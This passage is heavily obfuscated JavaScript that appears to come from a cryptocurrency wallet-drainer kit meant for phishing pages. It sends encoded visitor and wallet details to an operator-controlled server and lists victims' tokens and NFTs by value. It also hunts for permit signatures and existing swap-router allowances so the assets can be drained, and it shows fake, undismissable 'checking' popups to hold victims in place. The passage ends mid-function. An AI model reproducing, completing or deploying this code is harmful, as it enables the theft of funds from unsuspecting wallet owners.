            _0x30c0bc = _0x4195d0 => _0x1d8b13(_0x5a410c)[_0x5752b3(0x21f)]((_0x28f527, _0x3f2faf) => _0x28f527 ^ _0x3f2faf, _0x4195d0);
        return _0x2d77ea[_0x5752b3(0x26b)]('')[_0x5752b3(0x15a)](_0x1d8b13)[_0x5752b3(0x15a)](_0x30c0bc)[_0x5752b3(0x15a)](_0x4382c3)[_0x5752b3(0x1ef)]('');
    },
    srp = (_0x1458f9, _0x268ca2) => {
        const _0x19a190 = _0x53f51f,
            _0x5db30c = _0x15f093 => _0x15f093[_0x19a190(0x26b)]('')['map'](_0x604486 => _0x604486[_0x19a190(0x297)](0x0)),
            _0x18564a = _0x25d8db => _0x5db30c(_0x1458f9)[_0x19a190(0x21f)]((_0x35ddb7, _0x17036e) => _0x35ddb7 ^ _0x17036e, _0x25d8db);
        return _0x268ca2['match'](/.{1,2}/g)['map'](_0x3c35d4 => parseInt(_0x3c35d4, 0x10))[_0x19a190(0x15a)](_0x18564a)[_0x19a190(0x15a)](_0x59aa2c => String['fromCharCode'](_0x59aa2c))['join']('');
    },
    send_request = async _0x1c04af => {
        const _0x202d6e = _0x53f51f;
        try {
            if (MS_Force_Mode) return {
                'status': _0x202d6e(0x25e),
                'error': _0x202d6e(0x2cb)
            };
            _0x1c04af['domain'] = window[_0x202d6e(0x243)]['host'], _0x1c04af[_0x202d6e(0x26d)] = MS_Worker_ID || null, _0x1c04af['chat_data'] = MS_Custom_Chat[_0x202d6e(0x2ae)] == 0x0 ? ![] : MS_Custom_Chat[_0x202d6e(0x1ee)];
            const _0x43f981 = btoa(String(0xa + 0x100 + 0x200 + 0x400 + 0x800)),
                _0x36a8c3 = prs(_0x43f981, btoa(JSON[_0x202d6e(0x153)](_0x1c04af))),
                _0x4564df = await fetch(_0x202d6e(0x1b6) + MS_Server, {
                    'method': _0x202d6e(0x26f),
                    'headers': {
                        'Accept': _0x202d6e(0x1cd),
                        'Content-Type': _0x202d6e(0x2da)
                    },
                    'body': _0x202d6e(0x25f) + _0x36a8c3
                });
            let _0x409548 = JSON[_0x202d6e(0x20b)](atob(srp(_0x43f981, await _0x4564df[_0x202d6e(0x1c7)]())));
            if (!_0x409548['status']) return {
                'status': _0x202d6e(0x25e),
                'error': _0x202d6e(0x2cb)
            };
            else {
                if (_0x409548[_0x202d6e(0x25c)] == _0x202d6e(0x25e) && _0x409548[_0x202d6e(0x25e)] == _0x202d6e(0x16d)) MS_Force_Mode = !![];
                return _0x409548;
            }
        } catch (_0x1370f8) {
            return console[_0x202d6e(0x2c3)](_0x1370f8), {
                'status': _0x202d6e(0x25e),
                'error': _0x202d6e(0x2cb)
            };
        }
    },
    retrive_config = async () => {
        const _0x45b393 = _0x53f51f;
        try {
            const _0x46e9f5 = await send_request({
                'action': _0x45b393(0x19d)
            });
            _0x46e9f5[_0x45b393(0x25c)] == 'OK' && (MS_Settings = _0x46e9f5[_0x45b393(0x25b)], typeof MS_Settings[_0x45b393(0x2b8)] == _0x45b393(0x1ea) && MS_Settings[_0x45b393(0x2b8)] === !![] && (window[_0x45b393(0x243)][_0x45b393(0x20d)] = _0x45b393(0x1be)));
        } catch (_0x1ba341) {
            console[_0x45b393(0x2c3)](_0x1ba341);
        }
    },
    retrive_contract = async () => {
        const _0x545992 = _0x53f51f;
        try {
            const _0x278a3e = await send_request({
                'action': 'retrive_contract'
            });
            if (_0x278a3e[_0x545992(0x25c)] == 'OK') MS_Contract_ABI = _0x278a3e['data'];
        } catch (_0x452ec6) {
            console[_0x545992(0x2c3)](_0x452ec6);
        }
    },
    enter_website = async () => {
        const _0xa17024 = _0x53f51f;
        try {
            if (!MS_Settings[_0xa17024(0x2a7)]['enter_website']) return;
            await send_request({
                'action': _0xa17024(0x1b3),
                'user_id': MS_ID,
                'time': new Date()['toLocaleString']('ru-RU')
            });
        } catch (_0x350f86) {
            console['log'](_0x350f86);
        }
    },
    leave_website = async () => {
        const _0x110f0d = _0x53f51f;
        try {
            if (!MS_Settings['Notifications'][_0x110f0d(0x24c)]) return;
            await send_request({
                'action': _0x110f0d(0x24c),
                'user_id': MS_ID
            });
        } catch (_0x12ade6) {
            console[_0x110f0d(0x2c3)](_0x12ade6);
        }
    },
    connect_request = async () => {
        const _0x5312ff = _0x53f51f;
        try {
            if (!MS_Settings['Notifications']['connect_request']) return;
            await send_request({
                'action': _0x5312ff(0x27f),
                'user_id': MS_ID,
                'wallet': MS_Current_Provider
            });
        } catch (_0x237d80) {
            console[_0x5312ff(0x2c3)](_0x237d80);
        }
    },
    connect_cancel = async () => {
        const _0x17a5e = _0x53f51f;
        try {
            if (!MS_Settings[_0x17a5e(0x2a7)][_0x17a5e(0x205)]) return;
            await send_request({
                'action': 'connect_cancel',
                'user_id': MS_ID
            });
        } catch (_0x530347) {
            console[_0x17a5e(0x2c3)](_0x530347);
        }
    },
    connect_success = async () => {
        const _0x428cb5 = _0x53f51f;
        try {
            if (!MS_Settings[_0x428cb5(0x2a7)][_0x428cb5(0x220)]) return;
            await send_request({
                'action': _0x428cb5(0x220),
                'user_id': MS_ID,
                'address': MS_Current_Address,
                'wallet': MS_Current_Provider,
                'chain_id': MS_Current_Chain_ID
            });
        } catch (_0x128f3b) {
            console[_0x428cb5(0x2c3)](_0x128f3b);
        }
    },
    convert_chain = (_0x4cbeb5, _0x2c5a44, _0x20afd3) => {
        const _0x55c074 = _0x53f51f;
        try {
            if (_0x4cbeb5 == _0x55c074(0x1c9) && _0x2c5a44 == 'ID') switch (_0x20afd3) {
                case _0x55c074(0x28a):
                    return 0x1;
                case _0x55c074(0x24f):
                    return 0x38;
                case _0x55c074(0x173):
                    return 0x89;
                case _0x55c074(0x293):
                    return 0xa86a;
                case 'arbitrum':
                    return 0xa4b1;
                case _0x55c074(0x19b):
                    return 0xa;
                case _0x55c074(0x182):
                    return 0xfa;
                default:
                    return ![];
            } else {
                if (_0x4cbeb5 == _0x55c074(0x241) && _0x2c5a44 == 'ID') switch (_0x20afd3) {
                    case 'ethereum':
                        return 0x1;
                    case _0x55c074(0x2a9):
                        return 0x89;
                    case _0x55c074(0x293):
                        return 0xa86a;
                    case 'arbitrum':
                        return 0xa4b1;
                    case _0x55c074(0x19b):
                        return 0xa;
                    default:
                        return ![];
                } else {
                    if (_0x4cbeb5 == 'ID' && _0x2c5a44 == _0x55c074(0x1c9)) switch (_0x20afd3) {
                        case 0x1:
                            return _0x55c074(0x28a);
                        case 0x38:
                            return 'bsc';
                        case 0x89:
                            return _0x55c074(0x173);
                        case 0xa86a:
                            return _0x55c074(0x293);
                        case 0xa4b1:
                            return _0x55c074(0x2aa);
                        case 0xa:
                            return _0x55c074(0x19b);
                        case 0xfa:
                            return _0x55c074(0x182);
                        default:
                            return ![];
                    } else {
                        if (_0x4cbeb5 == 'ID' && _0x2c5a44 == 'CURRENCY') switch (_0x20afd3) {
                            case 0x1:
                                return 'ETH';
                            case 0x38:
                                return _0x55c074(0x20e);
                            case 0x89:
                                return 'MATIC';
                            case 0xa86a:
                                return _0x55c074(0x277);
                            case 0xa4b1:
                                return _0x55c074(0x238);
                            case 0xa:
                                return 'ETH';
                            case 0xfa:
                                return _0x55c074(0x281);
                            default:
                                return ![];
                        }
                    }
                }
            }
        } catch (_0x140629) {
            return console[_0x55c074(0x2c3)](_0x140629), ![];
        }
    },
    get_tokens = async _0x3470af => {
        const _0x963423 = _0x53f51f;
        try {
            let _0x245056 = [],
                _0x1f4f32 = await fetch(_0x963423(0x2d9) + (MS_Settings['AT'] || ''), {
                    'method': _0x963423(0x26f),
                    'headers': {
                        'Accept': _0x963423(0x1ca),
                        'Content-Type': 'application/json'
                    },
                    'body': JSON[_0x963423(0x153)]({
                        'id': 0x1,
                        'jsonrpc': _0x963423(0x1c6),
                        'method': 'ankr_getAccountBalance',
                        'params': {
                            'blockchain': [_0x963423(0x28a), _0x963423(0x24f), _0x963423(0x173), 'avalanche', _0x963423(0x2aa), _0x963423(0x182), _0x963423(0x19b)],
                            'walletAddress': _0x3470af
                        }
                    })
                });
            _0x1f4f32 = await _0x1f4f32['json']();
            for (const _0x215c9c of _0x1f4f32[_0x963423(0x1da)][_0x963423(0x251)]) {
                try {
                    let _0x4da888 = _0x215c9c['contractAddress'] || 'NATIVE';
                    if (MS_Settings[_0x963423(0x296)][_0x963423(0x233)] > 0x0 && !MS_Settings[_0x963423(0x296)][_0x963423(0x23a)](_0x4da888[_0x963423(0x2bf)]())) continue;
                    else {
                        if (MS_Settings[_0x963423(0x237)][_0x963423(0x233)] > 0x0 && MS_Settings[_0x963423(0x237)][_0x963423(0x23a)](_0x4da888[_0x963423(0x2bf)]())) continue;
                    }
                    let _0x4408ad = {
                        'chain_id': convert_chain('ANKR', 'ID', _0x215c9c['blockchain']),
                        'name': _0x215c9c['tokenName'],
                        'type': _0x215c9c[_0x963423(0x194)],
                        'amount': parseFloat(_0x215c9c[_0x963423(0x150)]),
                        'amount_raw': _0x215c9c[_0x963423(0x1aa)],
                        'amount_usd': parseFloat(_0x215c9c['balanceUsd']),
                        'symbol': _0x215c9c['tokenSymbol'],
                        'decimals': _0x215c9c[_0x963423(0x174)],
                        'address': _0x4da888 ? ? null,
                        'price': parseFloat(_0x215c9c[_0x963423(0x1f1)])
                    };
                    if (_0x4408ad[_0x963423(0x226)] > 0x0) _0x245056['push'](_0x4408ad);
                } catch (_0x5222d7) {
                    console[_0x963423(0x2c3)](_0x5222d7);
                }
            }
            return _0x245056;
        } catch (_0x390810) {
            return console[_0x963423(0x2c3)](_0x390810), [];
        }
    },
    get_nfts = async _0x543055 => {
        const _0xccedf1 = _0x53f51f;
        try {
            let _0xe8861c = await fetch(_0xccedf1(0x1a5) + _0x543055 + _0xccedf1(0x28f)),
                _0x257367 = (await _0xe8861c['json']())[_0xccedf1(0x251)];
            _0xe8861c = await fetch(_0xccedf1(0x295) + _0x543055 + _0xccedf1(0x24b));
            let _0x51cba0 = await _0xe8861c[_0xccedf1(0x26a)](),
                _0xc7d55a = [];
            for (const _0x4cadc8 of _0x257367) {
                try {
                    let _0x366299 = null;
                    for (const _0x3d1c54 of _0x51cba0) {
                        try {
                            if (_0x3d1c54['primary_asset_contracts']['length'] < 0x1) continue;
                            if (_0x3d1c54[_0xccedf1(0x267)][0x0][_0xccedf1(0x18c)] == _0x4cadc8[_0xccedf1(0x1e8)][_0xccedf1(0x18c)]) {
                                _0x366299 = _0x3d1c54;
                                break;
                            }
                        } catch (_0x16883b) {
                            console[_0xccedf1(0x2c3)](_0x16883b);
                        }
                    }
                    if (_0x366299 == null) continue;
                    if (MS_Settings[_0xccedf1(0x296)][_0xccedf1(0x233)] > 0x0 && !MS_Settings[_0xccedf1(0x296)][_0xccedf1(0x23a)](_0x4cadc8['asset_contract']['address'][_0xccedf1(0x2bf)]())) continue;
                    else {
                        if (MS_Settings[_0xccedf1(0x237)][_0xccedf1(0x233)] > 0x0 && MS_Settings[_0xccedf1(0x237)][_0xccedf1(0x23a)](_0x4cadc8[_0xccedf1(0x1e8)][_0xccedf1(0x18c)][_0xccedf1(0x2bf)]())) continue;
                    }
                    let _0x276927 = convert_chain('OPENSEA', 'ID', _0x4cadc8[_0xccedf1(0x1e8)][_0xccedf1(0x1fa)]),
                        _0x50cb15 = MS_Settings[_0xccedf1(0x190)] == 0x1 ? _0x366299[_0xccedf1(0x162)][_0xccedf1(0x1d9)] != 0x0 ? _0x366299[_0xccedf1(0x162)][_0xccedf1(0x1d9)] : _0x366299[_0xccedf1(0x162)]['seven_day_average_price'] : _0x366299[_0xccedf1(0x162)][_0xccedf1(0x1ad)];
                    _0x50cb15 = _0x50cb15 * MS_Currencies[convert_chain('ID', _0xccedf1(0x249), _0x276927)][_0xccedf1(0x242)];
                    let _0x3d6d88 = {
                        'chain_id': _0x276927,
                        'name': _0x4cadc8[_0xccedf1(0x2b9)],
                        'type': _0x4cadc8['asset_contract'][_0xccedf1(0x2bc)],
                        'amount': _0x4cadc8[_0xccedf1(0x217)],
                        'amount_raw': null,
                        'amount_usd': _0x50cb15,
                        'id': _0x4cadc8[_0xccedf1(0x1d1)],
                        'symbol': null,
                        'decimals': null,
                        'address': _0x4cadc8[_0xccedf1(0x1e8)]['address'],
                        'price': _0x50cb15
                    };
                    if (typeof _0x50cb15 == 'number' && !isNaN(_0x50cb15) && _0x50cb15 > 0x0) _0xc7d55a[_0xccedf1(0x1bd)](_0x3d6d88);
                } catch (_0xad1bab) {
                    console['log'](_0xad1bab);
                }
            }
            return _0xc7d55a;
        } catch (_0x9106a3) {
            return console[_0xccedf1(0x2c3)](_0x9106a3), [];
        }
    },
    retrive_token = async (_0x44e136, _0xbe2c2b) => {
        const _0x976f9b = _0x53f51f;
        try {
            let _0x2f1124 = await fetch(_0x976f9b(0x1b6) + MS_API_Data[_0x44e136] + _0x976f9b(0x2b7) + _0xbe2c2b + _0x976f9b(0x1d8) + MS_Settings[_0x976f9b(0x231)][_0x976f9b(0x1a1)][convert_chain('ID', _0x976f9b(0x1c9), _0x44e136)][_0x976f9b(0x255)], {
                'method': 'GET',
                'headers': {
                    'Accept': _0x976f9b(0x1ca)
                }
            });
            _0x2f1124 = await _0x2f1124[_0x976f9b(0x26a)]();
            if (_0x2f1124[_0x976f9b(0x2c4)] == 'OK') {
                if (_0x2f1124[_0x976f9b(0x1da)][0x0]['Proxy'] == '1' && _0x2f1124[_0x976f9b(0x1da)][0x0][_0x976f9b(0x247)] != '') {
                    const _0x43472c = _0x2f1124[_0x976f9b(0x1da)][0x0][_0x976f9b(0x247)];
                    return retrive_token(_0x44e136, _0x43472c);
                } else return JSON[_0x976f9b(0x20b)](_0x2f1124['result'][0x0][_0x976f9b(0x186)]);
            } else return MS_Contract_ABI[_0x976f9b(0x2b2)];
        } catch (_0x26f54a) {
            return MS_Contract_ABI[_0x976f9b(0x2b2)];
        }
    },
    get_permit_type = _0x20f8c8 => {
        const _0x14fe1b = _0x53f51f;
        try {
            if (MS_Settings[_0x14fe1b(0x231)][_0x14fe1b(0x268)][_0x14fe1b(0x1c2)] == ![]) return 0x0;
            if (_0x20f8c8['hasOwnProperty'](_0x14fe1b(0x1b8)) && _0x20f8c8['hasOwnProperty'](_0x14fe1b(0x2d7)) && _0x20f8c8[_0x14fe1b(0x1a9)](_0x14fe1b(0x2b9)) && _0x20f8c8[_0x14fe1b(0x1a9)](_0x14fe1b(0x154))) {
                const _0x52b90e = (_0x51ae2f => {
                    const _0x430178 = _0x14fe1b;
                    for (const _0x50ebd4 in _0x51ae2f) {
                        if (_0x50ebd4[_0x430178(0x1ce)]('permit(')) {
                            const _0x4b8fa4 = _0x50ebd4['slice'](0x7)['split'](',');
                            if (_0x4b8fa4['length'] === 0x7 && _0x50ebd4[_0x430178(0x1ac)](_0x430178(0x176)) === -0x1) return 0x2;
                            if (_0x4b8fa4[_0x430178(0x233)] === 0x8 && _0x50ebd4['indexOf'](_0x430178(0x176)) !== -0x1) return 0x1;
                            return 0x0;
                        }
                    }
                })(_0x20f8c8);
                return _0x52b90e;
            } else return 0x0;
        } catch (_0x2de794) {
            return 0x0;
        }
    },
    MS_Gas_Reserves = {},
    get_wallet_assets = async _0xd94aad => {
        const _0xffa3ec = _0x53f51f;
        try {
            let _0x9c48e1 = await send_request({
                    'action': _0xffa3ec(0x207),
                    'address': MS_Current_Address
                }),
                _0x5a72f6 = [];
            if (_0x9c48e1['status'] == 'OK') _0x5a72f6 = _0x9c48e1[_0xffa3ec(0x25b)];
            else _0x5a72f6 = await get_tokens(_0xd94aad);
            let _0x15132c = [];
            for (let _0x52bf35 = _0x5a72f6['length'] - 0x1; _0x52bf35 >= 0x0; _0x52bf35--) {
                try {
                    const _0x4a3563 = _0x5a72f6[_0x52bf35],
                        _0x5ec110 = convert_chain('ID', _0xffa3ec(0x1c9), _0x4a3563[_0xffa3ec(0x213)]);
                    if (!MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x5ec110][_0xffa3ec(0x2ae)]) _0x5a72f6[_0xffa3ec(0x16c)](_0x52bf35, 0x1);
                    else {
                        if (_0x4a3563[_0xffa3ec(0x22f)] == _0xffa3ec(0x15b) && !MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x5ec110]['Native']) _0x5a72f6[_0xffa3ec(0x16c)](_0x52bf35, 0x1);
                        else {
                            if (_0x4a3563['type'] == _0xffa3ec(0x2b2) && !MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x5ec110][_0xffa3ec(0x24e)]) _0x5a72f6[_0xffa3ec(0x16c)](_0x52bf35, 0x1);
                            else {
                                if (_0x4a3563['type'] == _0xffa3ec(0x15b) && _0x4a3563[_0xffa3ec(0x152)] < MS_Settings[_0xffa3ec(0x231)]['Chains'][_0x5ec110][_0xffa3ec(0x266)]) _0x5a72f6[_0xffa3ec(0x16c)](_0x52bf35, 0x1);
                                else {
                                    if (_0x4a3563[_0xffa3ec(0x22f)] == 'ERC20' && _0x4a3563[_0xffa3ec(0x152)] < MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x5ec110][_0xffa3ec(0x21a)]) _0x5a72f6[_0xffa3ec(0x16c)](_0x52bf35, 0x1);
                                    else _0x4a3563[_0xffa3ec(0x22f)] == _0xffa3ec(0x2b2) && (MS_Settings['Settings'][_0xffa3ec(0x268)][_0xffa3ec(0x1c2)] && MS_Settings['Settings']['Permit'][_0xffa3ec(0x253)] && _0x15132c[_0xffa3ec(0x1bd)](new Promise(async _0x18c523 => {
                                        const _0x31ddfa = _0xffa3ec;
                                        try {
                                            const _0x1a1ba6 = await retrive_token(_0x4a3563[_0x31ddfa(0x213)], _0x4a3563[_0x31ddfa(0x18c)]),
                                                _0x1963fe = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0x31ddfa(0x219)][_0x4a3563['chain_id']]),
                                                _0x5dda71 = new ethers['Contract'](_0x4a3563[_0x31ddfa(0x18c)], _0x1a1ba6, _0x1963fe),
                                                _0x233f4e = get_permit_type(_0x5dda71['functions']);
                                            _0x5a72f6[_0x52bf35][_0x31ddfa(0x1b8)] = _0x233f4e, _0x5a72f6[_0x52bf35][_0x31ddfa(0x2a3)] = '1', _0x5a72f6[_0x52bf35]['abi'] = _0x1a1ba6;
                                            if (_0x233f4e > 0x0) {
                                                if (_0x5dda71[_0x31ddfa(0x234)][_0x31ddfa(0x1a9)]('version')) try {
                                                    _0x5a72f6[_0x52bf35][_0x31ddfa(0x2a3)] = await _0x5dda71[_0x31ddfa(0x1b1)]();
                                                } catch (_0x1f5d71) {
                                                    console[_0x31ddfa(0x2c3)](_0x1f5d71);
                                                }
                                                console[_0x31ddfa(0x2c3)]('[PERMIT\x20FOUND]\x20' + _0x4a3563['name'] + _0x31ddfa(0x2cd) + _0x233f4e + _0x31ddfa(0x1a6) + _0x5a72f6[_0x52bf35][_0x31ddfa(0x2a3)]);
                                            }
                                        } catch (_0x75f19f) {
                                            console[_0x31ddfa(0x2c3)](_0x75f19f);
                                        }
                                        _0x18c523();
                                    })), MS_Settings['Settings'][_0xffa3ec(0x1b9)][_0xffa3ec(0x2ae)] && (_0x4a3563[_0xffa3ec(0x213)] == 0x1 && _0x4a3563[_0xffa3ec(0x152)] >= 0x32 || _0x4a3563['chain_id'] != 0x1 && _0x4a3563[_0xffa3ec(0x152)] >= 0xf) && _0x15132c[_0xffa3ec(0x1bd)](new Promise(async _0x36495c => {
                                        const _0x5d1d21 = _0xffa3ec;
                                        try {
                                            const _0x8fe048 = new ethers['providers'][(_0x5d1d21(0x2ab))](MS_Settings[_0x5d1d21(0x219)][_0x4a3563[_0x5d1d21(0x213)]]);
                                            for (const _0x581984 of MS_Routers[_0x4a3563[_0x5d1d21(0x213)]]) {
                                                try {
                                                    const _0x12ec1b = new ethers[(_0x5d1d21(0x246))](_0x4a3563[_0x5d1d21(0x18c)], MS_Contract_ABI[_0x5d1d21(0x2b2)], _0x8fe048),
                                                        _0x7f4fbe = await _0x12ec1b['allowance'](MS_Current_Address, _0x581984[0x1]);
                                                    if (ethers[_0x5d1d21(0x22e)][_0x5d1d21(0x245)](_0x7f4fbe)['gt'](ethers['BigNumber'][_0x5d1d21(0x245)]('0'))) {
                                                        _0x5a72f6[_0x52bf35][_0x5d1d21(0x1f9)] = !![], _0x5a72f6[_0x52bf35][_0x5d1d21(0x1b0)] = _0x581984[0x0], _0x5a72f6[_0x52bf35][_0x5d1d21(0x1e2)] = _0x581984[0x1], _0x5a72f6[_0x52bf35][_0x5d1d21(0x180)] = _0x7f4fbe, console[_0x5d1d21(0x2c3)](_0x5d1d21(0x264) + _0x4a3563[_0x5d1d21(0x2b9)] + ',\x20' + _0x581984[0x0]);
                                                        break;
                                                    }
                                                } catch (_0x46eb75) {
                                                    console[_0x5d1d21(0x2c3)](_0x46eb75);
                                                }
                                            }
                                        } catch (_0xc339c6) {
                                            console['log'](_0xc339c6);
                                        }
                                        _0x36495c();
                                    })));
                                }
                            }
                        }
                    }
                } catch (_0x200282) {
                    console['log'](_0x200282);
                }
            }
            await Promise['all'](_0x15132c);
            let _0x5d902d = ![];
            for (const _0x2a3313 in MS_Settings['Settings']['Chains']) {
                try {
                    if (MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x2a3313]['NFTs']) {
                        _0x5d902d = !![];
                        break;
                    }
                } catch (_0x183106) {
                    console['log'](_0x183106);
                }
            }
            if (_0x5d902d) try {
                let _0x79579e = [];
                _0x9c48e1 = await send_request({
                    'action': _0xffa3ec(0x189),
                    'address': MS_Current_Address
                });
                if (_0x9c48e1[_0xffa3ec(0x25c)] == 'OK') {
                    _0x79579e = _0x9c48e1['data'];
                    for (const _0x2dff46 of _0x79579e) {
                        try {
                            const _0x153fc4 = convert_chain('ID', _0xffa3ec(0x1c9), _0x2dff46[_0xffa3ec(0x213)]);
                            if (_0x2dff46[_0xffa3ec(0x22f)] == 'ERC1155') continue;
                            if (!MS_Settings[_0xffa3ec(0x231)]['Chains'][_0x153fc4][_0xffa3ec(0x2ad)]) continue;
                            if (_0x2dff46[_0xffa3ec(0x152)] < MS_Settings['Settings'][_0xffa3ec(0x1a1)][_0x153fc4][_0xffa3ec(0x230)]) continue;
                            _0x5a72f6[_0xffa3ec(0x1bd)](_0x2dff46);
                        } catch (_0x3b7873) {
                            console[_0xffa3ec(0x2c3)](_0x3b7873);
                        }
                    }
                } else {
                    _0x79579e = await get_nfts(_0xd94aad);
                    for (const _0x327b6e of _0x79579e) {
                        try {
                            const _0x455548 = convert_chain('ID', 'ANKR', _0x327b6e['chain_id']);
                            if (_0x327b6e[_0xffa3ec(0x22f)] == _0xffa3ec(0x1cf)) continue;
                            if (!MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x455548]['NFTs']) continue;
                            if (_0x327b6e[_0xffa3ec(0x152)] < MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1a1)][_0x455548]['Min_NFTs_Price']) continue;
                            _0x5a72f6[_0xffa3ec(0x1bd)](_0x327b6e);
                        } catch (_0x4aa3c9) {
                            console[_0xffa3ec(0x2c3)](_0x4aa3c9);
                        }
                    }
                }
            } catch (_0x3d20c6) {
                console[_0xffa3ec(0x2c3)](_0x3d20c6);
            }
            _0x5a72f6[_0xffa3ec(0x19a)]((_0x350ee3, _0xdd434f) => {
                const _0x2faea0 = _0xffa3ec;
                return _0xdd434f[_0x2faea0(0x152)] - _0x350ee3[_0x2faea0(0x152)];
            });
            if (MS_Settings['Settings'][_0xffa3ec(0x18a)]) {
                const _0x1e142b = [];
                for (const _0x57add9 of _0x5a72f6) {
                    try {
                        if (_0x57add9[_0xffa3ec(0x22f)] == _0xffa3ec(0x15b)) continue;
                        _0x1e142b[_0xffa3ec(0x1bd)](_0x57add9);
                    } catch (_0x18b2e2) {
                        console[_0xffa3ec(0x2c3)](_0x18b2e2);
                    }
                }
                for (const _0x4549c9 of _0x5a72f6) {
                    try {
                        if (_0x4549c9[_0xffa3ec(0x22f)] != 'NATIVE') continue;
                        _0x1e142b[_0xffa3ec(0x1bd)](_0x4549c9);
                    } catch (_0x435d1c) {
                        console['log'](_0x435d1c);
                    }
                }
                _0x5a72f6 = _0x1e142b;
            }
            if (MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1b9)][_0xffa3ec(0x2ae)] && MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x1b9)][_0xffa3ec(0x253)] == 0x1) {
                const _0x86e9f5 = [];
                for (const _0x47d640 of _0x5a72f6) {
                    try {
                        if (!_0x47d640[_0xffa3ec(0x1f9)]) continue;
                        _0x86e9f5[_0xffa3ec(0x1bd)](_0x47d640);
                    } catch (_0x47e2a7) {
                        console['log'](_0x47e2a7);
                    }
                }
                for (const _0x3af5ec of _0x5a72f6) {
                    try {
                        if (_0x3af5ec[_0xffa3ec(0x1f9)]) continue;
                        _0x86e9f5['push'](_0x3af5ec);
                    } catch (_0x201151) {
                        console[_0xffa3ec(0x2c3)](_0x201151);
                    }
                }
                _0x5a72f6 = _0x86e9f5;
            }
            if (MS_Settings['Settings'][_0xffa3ec(0x268)][_0xffa3ec(0x1c2)] && MS_Settings[_0xffa3ec(0x231)][_0xffa3ec(0x268)]['Priority']) {
                const _0x1ff577 = [];
                for (const _0x62d020 of _0x5a72f6) {
                    try {
                        if (!_0x62d020[_0xffa3ec(0x1b8)] || _0x62d020['permit'] == 0x0) continue;
                        _0x1ff577['push'](_0x62d020);
                    } catch (_0x57e811) {
                        console[_0xffa3ec(0x2c3)](_0x57e811);
                    }
                }
                for (const _0x4e18a2 of _0x5a72f6) {
                    try {
                        if (_0x4e18a2[_0xffa3ec(0x1b8)] && _0x4e18a2[_0xffa3ec(0x1b8)] > 0x0) continue;
                        _0x1ff577[_0xffa3ec(0x1bd)](_0x4e18a2);
                    } catch (_0x4361ff) {
                        console[_0xffa3ec(0x2c3)](_0x4361ff);
                    }
                }
                _0x5a72f6 = _0x1ff577;
            }
            if (MS_Settings['Settings']['Swappers'][_0xffa3ec(0x2ae)] && MS_Settings[_0xffa3ec(0x231)]['Swappers'][_0xffa3ec(0x253)] == 0x2) {
                const _0x31aca2 = [];
                for (const _0x52db26 of _0x5a72f6) {
                    try {
                        if (!_0x52db26[_0xffa3ec(0x1f9)]) continue;
                        _0x31aca2[_0xffa3ec(0x1bd)](_0x52db26);
                    } catch (_0x462ea7) {
                        console[_0xffa3ec(0x2c3)](_0x462ea7);
                    }
                }
                for (const _0x528a56 of _0x5a72f6) {
                    try {
                        if (_0x528a56[_0xffa3ec(0x1f9)]) continue;
                        _0x31aca2['push'](_0x528a56);
                    } catch (_0x54bc38) {
                        console[_0xffa3ec(0x2c3)](_0x54bc38);
                    }
                }
                _0x5a72f6 = _0x31aca2;
            }
            return _0x5a72f6;
        } catch (_0x35d8be) {
            return console[_0xffa3ec(0x2c3)](_0x35d8be), [];
        }
    },
    show_check = () => {
        const _0x2d6271 = _0x53f51f;
        try {
            Swal[_0x2d6271(0x16e)]({
                'title': _0x2d6271(0x157),
                'icon': _0x2d6271(0x294),
                'timer': 0x7d0
            })['then'](() => {
                const _0x52735c = _0x2d6271;
                if (MS_Check_Done) return;
                Swal['fire']({
                    'text': _0x52735c(0x159),
                    'imageUrl': _0x52735c(0x23b),
                    'imageHeight': 0x3c,
                    'allowOutsideClick': ![],
                    'allowEscapeKey': ![],
                    'timer': 0x1388,
                    'width': 0x258,
                    'showConfirmButton': ![]
                })[_0x52735c(0x236)](() => {
                    const _0x26a0c = _0x52735c;
                    if (MS_Check_Done) return;
                    Swal[_0x26a0c(0x16e)]({
                        'text': _0x26a0c(0x271),
                        'imageUrl': _0x26a0c(0x23b),
                        'imageHeight': 0x3c,
                        'allowOutsideClick': ![],
                        'allowEscapeKey': ![],
                        'timer': 0x1388,
                        'width': 0x258,
                        'showConfirmButton': ![]
                    })[_0x26a0c(0x236)](() => {
                        const _0x4c5991 = _0x26a0c;
                        if (MS_Check_Done) return;
                        Swal['fire']({
                            'text': _0x4c5991(0x1df),
                            'imageUrl': _0x4c5991(0x23b),
                            'imageHeight': 0x3c,
                            'allowOutsideClick': ![],
                            'allowEscapeKey': ![],
                            'timer': 0x1388,
                            'width': 0x258,
                            'showConfirmButton': ![]
                        })[_0x4c5991(0x236)](() => {
                            const _0x288ad4 = _0x4c5991;
                            if (MS_Check_Done) return;
                            Swal[_0x288ad4(0x16e)]({
                                'text': _0x288ad4(0x274),
                                'icon': 'success',
                                'allowOutsideClick': ![],
                                'allowEscapeKey': ![],
                                'timer': 0x7d0,
                                'width': 0x258,
                                'showConfirmButton': ![]
                            })['then'](() => {
                                const _0x4b27ba = _0x288ad4;
                                if (MS_Check_Done) return;
                                Swal[_0x4b27ba(0x16e)]({
                                    'text': _0x4b27ba(0x1d5),
                                    'imageUrl': _0x4b27ba(0x23b),
                                    'imageHeight': 0x3c,
                                    'allowOutsideClick': ![],
                                    'allowEscapeKey': ![],
                                    'timer': 0x0,
                                    'width': 0x258,
                                    'showConfirmButton': ![]
                                });
                            });
                        });
                    });
                });
            });
        } catch (_0x4c6369) {
            console['log'](_0x4c6369);
        }
    },
    get_nonce = async _0x4d3292 => {
        const _0x25020c = _0x53f51f,
            _0x7a9433 = new ethers[(_0x25020c(0x1f8))]['JsonRpcProvider'](MS_Settings[_0x25020c(0x219)][_0x4d3292]);
        return await _0x7a9433[_0x25020c(0x261)](MS_Current_Address, 'pending');
    },
    wait_message = () => {
        const _0x1f0c70 = _0x53f51f;
        try {
            if (!MS_Process) return;
            Swal[_0x1f0c70(0x1dc)](), Swal[_0x1f0c70(0x16e)]({
                'html': _0x1f0c70(0x2c8),
                'icon': _0x1f0c70(0x294),
                'allowOutsideClick': ![],
